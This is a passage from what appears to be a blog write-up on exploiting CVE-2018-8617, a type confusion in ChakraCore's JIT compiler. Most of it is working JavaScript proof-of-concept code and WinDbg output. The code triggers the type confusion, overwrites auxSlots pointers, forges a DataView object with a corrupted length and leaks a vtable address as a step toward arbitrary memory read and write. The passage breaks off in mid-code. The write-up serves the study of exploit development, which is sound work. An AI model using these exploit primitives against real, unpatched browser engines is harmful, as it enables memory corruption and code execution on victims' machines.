00007ffa`361bb170 4889542410      mov     qword ptr [rsp+10h],rdx ss:0000006f`96afe748=0000000000000000
0:003&gt; bp chakracore!Js::DynamicTypeHandler::AdjustSlots+0x88
0:003&gt; g
Breakpoint 1 hit
chakracore!Js::DynamicTypeHandler::AdjustSlots+0x88:
00007ffa`362abfe0 4c894b10        mov     qword ptr [rbx+10h],r9 ds:000001dd`d183fe70=0001000000000001
0:003&gt; dq rbx L4
000001dd`d183fe60  00007ffa`36560850 000001dd`d17f1040 &lt;---- &#39;o&#39; object
000001dd`d183fe70  00010000`00000001 00000000`00000000
0:003&gt; bd 1
0:003&gt; g
Breakpoint 0 hit
chakracore!Js::Math::Sin:
00007ffa`361bb170 4889542410      mov     qword ptr [rsp+10h],rdx ss:0000006f`96afe748=0000000000000000
0:003&gt; dq 000001dd`d183fe60 L4
000001dd`d183fe60  00007ffa`36560850 000001dd`d18469c0
000001dd`d183fe70  000001dd`d17c9180 000001dd`d1846900
                           ^
                           |
                           +------- auxSlots overwritten with pointer to &#39;obj&#39; obj

0:003&gt; dq 000001dd`d17c9180 L4
000001dd`d17c9180  00007ffa`36560850 000001dd`d17bab80
000001dd`d17c9190  000001dd`d17ab360 000001dd`d17babc0
                                     ^
                                     |
                                     + &#39;obj&#39; memory overwritten with pointer to &#39;dv1&#39; obj

0:003&gt; dqs 000001dd`d17babc0 L1
000001dd`d17babc0  00007ffa`365dd3c8 chakracore!Js::DataView::`vftable&#39;
</code></pre><p>So, it looks like we overshot and <code>o.c</code> wrote to index 4. However, if we update the PoC to use <code>o.b</code> and relaunch we don&rsquo;t write to the 3rd index which is where the auxSlots pointer would normally be stored.</p>
<p>However, using the following PoC:</p>
<pre tabindex="0"><code>obj = {a: 0x41, b: 0x42, c: 0x43, d: 0x44,
       e: 0x45, f: 0x46, g: 0x47, h: 0x48,
       i: 0x49, j: 0x4A, k: 0x4B, l: 0x4C};

var dv1 = new DataView(new ArrayBuffer(0x100));

function opt(thingOne, thingTwo, value) {
    thingOne.b = 2;
    thingTwo.push(0);
    thingOne.a = value;
}

function main() {
    Object.prototype.push = Array.prototype.push;

    for (let i = 0; i &lt; 1000; i++) {
        let a = {a: 1, b: 2};
        opt(a, {});
    }

    let o = {a: 1, b: 2};

    console.log(obj);

    Math.sin(1);

    // Trigger Type Confusion, writing a pointer to obj in
    // o&#39;s auxSlots pointer.
    opt(o, o, obj);

    // Set the auxSlots pointer of &#34;obj&#34; object to dv1
    o.c = dv1;

    Math.sin(1);
}

print(&#34;[*] Attach WinDbg now..&#34;);
readline();
main();
</code></pre><p>We see something interesting.</p>
<pre tabindex="0"><code>Breakpoint 3 hit
chakracore!Js::DynamicTypeHandler::AdjustSlots+0x88:
00007ff9`c112bfe0 4c894b10        mov     qword ptr [rbx+10h],r9 ds:00000299`0da2fe50=0001000000000001
0:003&gt; dq rbx L4
00000299`0da2fe40  00007ff9`c13e0850 00000299`0d9e22c0 &lt;----- &#39;o&#39; obj
00000299`0da2fe50  00010000`00000001 00000000`00000000
0:003&gt; g
breakpoint 3 redefined
chakracore!Js::Math::Sin:
00007ff9`c103b170 4889542410      mov     qword ptr [rsp+10h],rdx ss:000000c2`578fe3e8=0000000000000000
0:003&gt; dq 00000299`0da2fe40 L4
00000299`0da2fe40  00007ff9`c13e0850 00000299`0da36c40 &lt;--- auxSlots overwritten with 
00000299`0da2fe50  00000299`0d991af0 00000299`0da36b80      pointer to &#39;obj&#39; object
                                                            (00000299`0d991af0)

0:003&gt; dq 00000299`0d991af0 L6
00000299`0d991af0  00007ff9`c13e0850 00000299`0d9aae40 &lt;---- Failure to overwrite auxSlots of
00000299`0d991b00  00010000`00000041 00000299`0d9aae80       &#39;obj&#39; object
00000299`0d991b10  00010000`00000043 00010000`00000044
0:003&gt; dqs 00000299`0d9aae80 L1
00000299`0d9aae80  00007ff9`c145d3c8 chakracore!Js::DataView::`vftable&#39;
</code></pre><p>This shows that we did in fact overwrite the auxSlots of the <code>o</code> object but <em><strong>not</strong></em> the auxSlots of the <code>obj</code> object. However, we can see that this is in fact our object as we see 0x41, 0x43, and 0x44. Let&rsquo;s try to write to it directly?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mh">0x41</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mh">0x42</span><span class="p">,</span> <span class="nx">c</span><span class="o">:</span> <span class="mh">0x43</span><span class="p">,</span> <span class="nx">d</span><span class="o">:</span> <span class="mh">0x44</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">       <span class="nx">e</span><span class="o">:</span> <span class="mh">0x45</span><span class="p">,</span> <span class="nx">f</span><span class="o">:</span> <span class="mh">0x46</span><span class="p">,</span> <span class="nx">g</span><span class="o">:</span> <span class="mh">0x47</span><span class="p">,</span> <span class="nx">h</span><span class="o">:</span> <span class="mh">0x48</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">       <span class="nx">i</span><span class="o">:</span> <span class="mh">0x49</span><span class="p">,</span> <span class="nx">j</span><span class="o">:</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="nx">k</span><span class="o">:</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="nx">l</span><span class="o">:</span> <span class="mh">0x4C</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dv1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">thingOne</span><span class="p">,</span> <span class="nx">thingTwo</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">thingOne</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">thingTwo</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">thingOne</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Trigger Type Confusion, writing a pointer to obj in
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// o&#39;s auxSlots pointer.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">opt</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">o</span><span class="p">,</span> <span class="nx">obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Set the auxSlots pointer of &#34;obj&#34; object to dv1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">obj</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">dv1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Attach WinDbg now..&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">();</span>
</span></span></code></pre></div><p>This time, we see that we have successfully created the expected chain.</p>
<pre tabindex="0"><code>0:003&gt; g
Breakpoint 1 hit
chakracore!Js::DynamicTypeHandler::AdjustSlots+0x88:
00007ff9`c112bfe0 4c894b10        mov     qword ptr [rbx+10h],r9 ds:000001d1`2b4ffe30=0001000000000001
0:003&gt; dq rbx L4
000001d1`2b4ffe20  00007ff9`c13e0850 000001d1`2b4b22c0
000001d1`2b4ffe30  00010000`00000001 00000000`00000000
0:003&gt; g
breakpoint 1 redefined
chakracore!Js::Math::Sin:
00007ff9`c103b170 4889542410      mov     qword ptr [rsp+10h],rdx ss:000000c0`4b6fe028=0000000000000000
0:003&gt; dq 000001d1`2b4ffe20 L4
000001d1`2b4ffe20  00007ff9`c13e0850 000001d1`2b506c00 &lt;---- &#39;o&#39; obj
000001d1`2b4ffe30  000001d1`2b461af0 000001d1`2b506b80
                        ^
                        |
                        +----- auxSlots points to &#39;obj&#39; object


0:003&gt; dq 000001d1`2b461af0 L4
000001d1`2b461af0  00007ff9`c13e0850 000001d1`2b47ae40 &lt;---- &#39;obj&#39; obj
000001d1`2b461b00  000001d1`2b47ae80 00010000`00000042
                        ^
                        |
                        +------ auxSlots points to &#39;dv1 object


0:003&gt; dqs 000001d1`2b47ae80 L1
000001d1`2b47ae80  00007ff9`c145d3c8 chakracore!Js::DataView::`vftable&#39;

0:003&gt; dq 000001d1`2b47ae80
000001d1`2b47ae80  00007ff9`c145d3c8 000001d1`2b4631c0 &lt;----- &#39;dv1&#39; obj
000001d1`2b47ae90  00000000`00000000 00000000`00000000
000001d1`2b47aea0  00000000`00000100 000001d1`2b4790a0
000001d1`2b47aeb0  00000000`00000000 000001c9`29a4d690
000001d1`2b47aec0  00007ff9`c142fd40 000001d1`2b441fc0
000001d1`2b47aed0  00007ff9`c15267d8 00000000`00000006
000001d1`2b47aee0  00007ff9`c15267c0 000001d1`2b467ca0
000001d1`2b47aef0  000001d1`2b467cc0 00000000`00000000
</code></pre><p>So, these objects are linked but we still cannot read and write from arbitrary memory&hellip;</p>

<h2 class="relative group">Creating DataView object (custom exploit primitive) 
    <div id="creating-dataview-object-custom-exploit-primitive" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#creating-dataview-object-custom-exploit-primitive" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>So, after a lot of trial and error I was able to create my own object in memory using the type confusion. Below is the code to do this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger_type_confusion</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">createDataViewObject</span><span class="p">(</span><span class="nx">customLength</span><span class="p">,</span> <span class="nx">newBuffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">dvObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">leak_obj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span><span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">dvObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">dvVfptrHeader</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dvType</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">targetObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">42</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">42</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">ptrObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">ptrObj</span><span class="p">,</span> <span class="nx">ptrObj</span><span class="p">,</span> <span class="nx">targetObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ptrObj</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">dvVfptrHeader</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ptrObj</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">dvType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="nx">b</span><span class="o">:</span><span class="mi">1</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">writer</span><span class="p">,</span> <span class="nx">writer</span><span class="p">,</span> <span class="nx">ptrObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">customLength</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">newBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">targetObj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">trigger_type_confusion</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">arrBuff</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">targetObj</span> <span class="o">=</span> <span class="nx">createDataViewObject</span><span class="p">(</span><span class="mi">4242</span><span class="p">,</span> <span class="nx">arrBuff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Created DataView object with corrupted length: &#34;</span> <span class="o">+</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">byteLength</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtableAddr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] vtable address is: 0x&#34;</span> <span class="o">+</span> <span class="nx">vtableAddr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Attach WinDbg now...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">();</span>
</span></span></code></pre></div><p>Once ran, we successfully got our leak :)</p>
<pre tabindex="0"><code>C:\Users\admin&gt;C:\tools\core\ch.exe poc.js
[*] Attach WinDbg now...

[*] Created DataView object with corrupted length: 4242
[*] vtable address is: 0x7ff8c81050b8
</code></pre><p>Let&rsquo;s break down the <code>createDataViewObject()</code> function which is used to create a custom <strong>DataView Object</strong> in memory. First, we create a normal DataView Object and a normal object with two elements then we trigger the type confusion as seen below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">dvObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">leak_obj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span><span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">dvObject</span><span class="p">);</span>
</span></span></code></pre></div><p>Next, we see that we leak the headers of <code>dvObject</code> in memory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="nx">dvVfptrHeader</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dvType</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">b</span><span class="p">;</span>
</span></span></code></pre></div><p>During debugging it was found that <code>leak.a</code> and <code>leak.b</code> point to the virtual function pointer and object type respectively of the &ldquo;type confused&rdquo; object. We can see this by writing to these members, which should overwrite the headers of the DataView Object (dvObject).</p>
<p>Let&rsquo;s see this using the following code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">leak_obj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span><span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">dvObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">dvObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mh">0x42</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span></span></code></pre></div><p>Once ran, we see the following in WinDbg:</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="alt text" src="/CVE-2018-8617-Analysis/ab_read_write.png">

  
</figure>
</p>
<p>As you can expect, if we can corrupt (write) to the header of the object we can read them. With the headers leaked in theory we can create our own DataView Object right? Well taking a closer look at the object, we need to corrupt the <strong>length</strong> and <strong>buffer</strong> itself.</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="alt text" src="/CVE-2018-8617-Analysis/dvObject.png">

  
</figure>
</p>
<p>Now if we look further into the function we can see how we overcame this hurdle.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">targetObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">42</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">42</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">ptrObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">targetObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">ptrObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span></span></code></pre></div><p>Allocating these two objects we can see that the header of the second object is aligned to allow us to create our object!</p>
<pre tabindex="0"><code>[*] console.log() called, Object @{0x000002b3ae34fe00} &lt;--- targetObj
000002b3`ae34fe00  00007ff8`c8100850 000002b3`ae2eef00
000002b3`ae34fe10  00010000`0000002a 00010000`0000002a
000002b3`ae34fe20  00007ff8`c8100850 000002b3`ae2eef00 &lt;--- ptrObj header!
ModLoad: 00007ff8`f7e90000 00007ff8`f7e9c000   C:\Windows\SYSTEM32\CRYPTBASE.DLL
[*] console.log() called, Object @{0x000002b3ae34fe20} &lt;--- ptrObj
000002b3`ae34fe20  00007ff8`c8100850 000002b3`ae2eef00
000002b3`ae34fe30  00010000`00000001 00010000`00000002
000002b3`ae34fe40  00010000`00000001 000002b3`ae34ef00
</code></pre><p>So, if we corrupt the <code>targetObj</code> header to become a DataView object, then corrupt <code>ptrObj</code> headers to a length and address we have successfully created our own DataView Object!</p>

<h1 class="relative group">Leveraging the custom DataView object 
    <div id="leveraging-the-custom-dataview-object" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#leveraging-the-custom-dataview-object" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>Although this is a powerful primitive, we don’t have as much control as the method taught to us by Offsec as we are unaware of how to convert a floating point to a normal address&hellip; Meaning the address field will be hard to arbitrarily edit.</p>
<p>To overcome this, I noticed that if we create another DataView Object locally, it will get allocated in the address space we can read from with the last primitive! However, we have no exact way to determine the EXACT location in memory this object is, luckily since it will be in said address space, we can hunt for it using a unique length! PoC code below!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dynamicDataViewObj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger_type_confusion</span><span class="p">()</span> <span class="p">{</span>
